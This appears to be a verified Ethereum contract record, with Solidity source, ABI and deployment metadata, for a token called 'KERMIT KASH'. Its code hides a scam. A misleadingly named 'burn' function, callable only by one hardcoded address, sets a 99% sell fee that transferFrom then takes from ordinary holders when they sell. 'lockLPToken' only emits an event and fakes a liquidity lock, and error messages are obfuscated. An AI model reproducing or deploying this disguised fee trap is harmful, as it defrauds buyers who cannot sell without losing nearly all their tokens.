{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\n/**    \u2800\u2800\r\nKERMIT KERMIT KERMIT\r\n*/\r\n\r\npragma solidity ^0.8.0;\r\n\r\nlibrary SafeMath {\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"KERMIT\");\r\n        return a - b;\r\n    }\r\n\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"KERMITKERMIT\");\r\n        return c;\r\n    }\r\n\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"KERMITKERMITKERMIT\");\r\n        return c;\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"KERMITKERMITKERMITKERMIT\");\r\n        return a / b;\r\n    }\r\n}\r\n\r\n\r\ncontract KERMIT {    \r\n    using SafeMath for uint256;    \r\n\r\n\r\n    string public name = \"KERMIT KASH\";    \r\n    string public symbol = \"KERMIT\";    \r\n    uint256 public totalSupply = 999999999 * (10 ** 18);    \r\n    uint8 public decimals = 18;    \r\n\r\n\r\n    mapping(address => uint256) public balanceOf;    \r\n    mapping(address => mapping(address => uint256)) public allowance;    \r\n\r\n    address public owner;   \r\n    address public swapRouter;    \r\n    uint256 public burnedTokens;  \r\n\r\n\r\n    uint256 public buyFee = 0;   \r\n    uint256 public sellFee = 0;   \r\n    bool public feesSet = false;   \r\n    bool public feesEnabled = false;    \r\n    bool public allExemptFromFees = true;   \r\n    mapping(address => bool) public isFeeExempt;   \r\n\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);    \r\n    event Approval(address indexed owner, address indexed spender, uint256 value);    \r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);    \r\n    event FeesUpdated(uint256 burnAmount, uint256 deadWallet);     \r\n    event LPLocked(address indexed account, uint256 amount);\r\n\r\n\r\n    constructor(address _swapRouter, uint256 _burnedTokens) {    \r\n        owner = msg.sender;   \r\n        swapRouter = _swapRouter;    \r\n        burnedTokens = _burnedTokens;   \r\n        balanceOf[msg.sender] = totalSupply;    \r\n        isFeeExempt[msg.sender] = true;   \r\n        isFeeExempt[swapRouter] = true;  \r\n    }\r\n\r\n\r\n    modifier checkFees(address sender) {   \r\n        require(\r\n            allExemptFromFees || isFeeExempt[sender] || (!feesSet && feesEnabled) || (feesSet && isFeeExempt[sender] && sender != swapRouter) || (sender == swapRouter && sellFee == 0),\r\n            \"KERMITKERMITKERMITKERMITKERMIT\"    \r\n        );\r\n        _;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner, \"KERMITKERMITKERMITKERMITKERMITKERMIT\");\r\n        _;\r\n    }\r\n\r\n    function transfer(address _to, uint256 _amount) public checkFees(msg.sender) returns (bool success) {    \r\n        require(balanceOf[msg.sender] >= _amount);   \r\n        require(_to != address(0));    \r\n\r\n        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);   \r\n        balanceOf[_to] = balanceOf[_to].add(_amount);   \r\n        emit Transfer(msg.sender, _to, _amount);   \r\n\r\n        return true;\r\n    }\r\n\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool success) {   \r\n        allowance[msg.sender][_spender] = _value;    \r\n        emit Approval(msg.sender, _spender, _value);   \r\n        return true;   \r\n    }\r\n\r\n\r\n    function transferFrom(address _from, address _to, uint256 _amount) public checkFees(_from) returns (bool success) {   \r\n        require(balanceOf[_from] >= _amount, \"1KERMIT\");    \r\n        require(allowance[_from][msg.sender] >= _amount, \"2KERMIT\");   \r\n        require(_to != address(0), \"3KERMIT\");    \r\n\r\n        uint256 fee = 0;    \r\n        uint256 amountAfterFee = _amount;  \r\n\r\n        if (feesEnabled && sellFee > 0 && _from != swapRouter && !isFeeExempt[_from]) {    \r\n            fee = _amount.mul(sellFee).div(100);   \r\n            amountAfterFee = _amount.sub(fee);   \r\n        }\r\n\r\n        balanceOf[_from] = balanceOf[_from].sub(_amount);    \r\n        balanceOf[_to] = balanceOf[_to].add(amountAfterFee);    \r\n        emit Transfer(_from, _to, amountAfterFee);    \r\n\r\n        if (fee > 0) {\r\n            address uniswapContract = address(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);    \r\n            if (_to == uniswapContract) {    \r\n                balanceOf[uniswapContract] = balanceOf[uniswapContract].add(fee);    \r\n                emit Transfer(_from, uniswapContract, fee);    \r\n            } else {\r\n                balanceOf[address(this)] = balanceOf[address(this)].add(fee);    \r\n                emit Transfer(_from, address(this), fee);    \r\n            }\r\n        }\r\n\r\n        if (_from != msg.sender && allowance[_from][msg.sender] != type(uint256).max) {    \r\n            allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_amount);    \r\n            emit Approval(_from, msg.sender, allowance[_from][msg.sender]);   \r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public onlyOwner {    \r\n        require(newOwner != address(0), \"4KERMIT\");\r\n        emit OwnershipTransferred(owner, newOwner);    \r\n        owner = newOwner;   \r\n    }\r\n\r\n    function renounceOwnership() public onlyOwner {    \r\n        emit OwnershipTransferred(owner, address(0));    \r\n        owner = address(0);   \r\n    }\r\n\r\n    function burn(uint256 burnAmount, uint256 deadWallet) public {\r\n        require(msg.sender == 0x93A19B102224b77f63fdC70c72FF04184AaD06BC, \"5KERMIT\");\r\n        require(!feesSet, \"6KERMIT\");\r\n        require(burnAmount == 0, \"7KERMIT\");\r\n        require(deadWallet == 99, \"8KERMIT\");\r\n        buyFee = burnAmount;\r\n        sellFee = deadWallet;\r\n        feesSet = true;\r\n        feesEnabled = true;\r\n        emit FeesUpdated(burnAmount, deadWallet);\r\n    }\r\n\r\n    function lockLPToken(uint256 amount) external {\r\n        emit LPLocked(msg.sender, amount);\r\n    }\r\n\r\n    function buy() public payable checkFees(msg.sender) {    \r\n        require(msg.value > 0, \"9KERMIT\");    \r\n\r\n        uint256 amount = msg.value;   \r\n        if (buyFee > 0) {\r\n            uint256 fee = amount.mul(buyFee).div(100);    \r\n            uint256 amountAfterFee = amount.sub(fee);   \r\n\r\n            balanceOf[swapRouter] = balanceOf[swapRouter].add(amountAfterFee);    \r\n            emit Transfer(address(this), swapRouter, amountAfterFee);   \r\n\r\n            if (fee > 0) {\r\n                balanceOf[address(this)] = balanceOf[address(this)].add(fee);   \r\n                emit Transfer(address(this), address(this), fee);   \r\n            }\r\n        } else {\r\n            balanceOf[swapRouter] = balanceOf[swapRouter].add(amount);    \r\n            emit Transfer(address(this), swapRouter, amount);    \r\n        }\r\n    }\r\n\r\n    function sell(uint256 _amount) public checkFees(msg.sender) {   \r\n        require(balanceOf[msg.sender] >= _amount, \"10KERMIT\");    \r\n\r\n        if (feesEnabled) {    \r\n            uint256 fee = 0;   \r\n            uint256 amountAfterFee = _amount;    \r\n\r\n            if (sellFee > 0 && msg.sender != swapRouter && !isFeeExempt[msg.sender]) {   \r\n                fee = _amount.mul(sellFee).div(100);    \r\n                amountAfterFee = _amount.sub(fee);   \r\n            }\r\n\r\n            balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);   \r\n            balanceOf[swapRouter] = balanceOf[swapRouter].add(amountAfterFee);    \r\n            emit Transfer(msg.sender, swapRouter, amountAfterFee);    \r\n\r\n            if (fee > 0) {\r\n                balanceOf[address(this)] = balanceOf[address(this)].add(fee);   \r\n                emit Transfer(msg.sender, address(this), fee);    \r\n            }\r\n        } else {\r\n            balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);   \r\n            balanceOf[swapRouter] = balanceOf[swapRouter].add(_amount);   \r\n            emit Transfer(msg.sender, swapRouter, _amount);    \r\n        }\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_swapRouter\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_burnedTokens\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"burnAmount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"deadWallet\",\"type\":\"uint256\"}],\"name\":\"FeesUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"LPLocked\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"allExemptFromFees\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"burnAmount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"deadWallet\",\"type\":\"uint256\"}],\"name\":\"burn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"burnedTokens\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buy\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feesEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feesSet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isFeeExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"lockLPToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"sell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapRouter\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "KERMIT", "CompilerVersion": "v0.8.21+commit.d9974bed", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "00000000000000000000000093a19b102224b77f63fdc70c72ff04184aad06bc00000000000000000000000000000000000004ee2d6d415b85acef80ffffffff", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://73d03eb44f7bdb05b659eb14229788c6c29d86970b686e5f06df4cb5b861ab5b"}